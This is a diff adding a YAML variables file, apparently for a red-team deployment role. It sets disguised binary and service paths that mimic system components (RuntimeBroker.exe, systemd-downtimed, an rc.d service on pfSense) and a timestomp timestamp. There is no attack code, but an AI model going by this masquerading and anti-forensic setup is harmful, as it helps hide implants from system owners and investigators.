@@ -1,0 +1,8 @@
+pfsense_binary: "/usr/bin/ipv4"
+pfsense_service: "/etc/rc.d/autounmount"
+windows_binary: "C:\\ProgramData\\RuntimeBroker.exe"
+windows_binary_directory: "C:\\ProgramData"
+windows_binary_name: "RuntimeBroker.exe"
+linux_binary: "/usr/bin/systemd-downtimed"
+linux_service: "/usr/lib/systemd/system/systemd-downtimed.service"
+timestomp_time: "202111231210.15" #change depending on comp
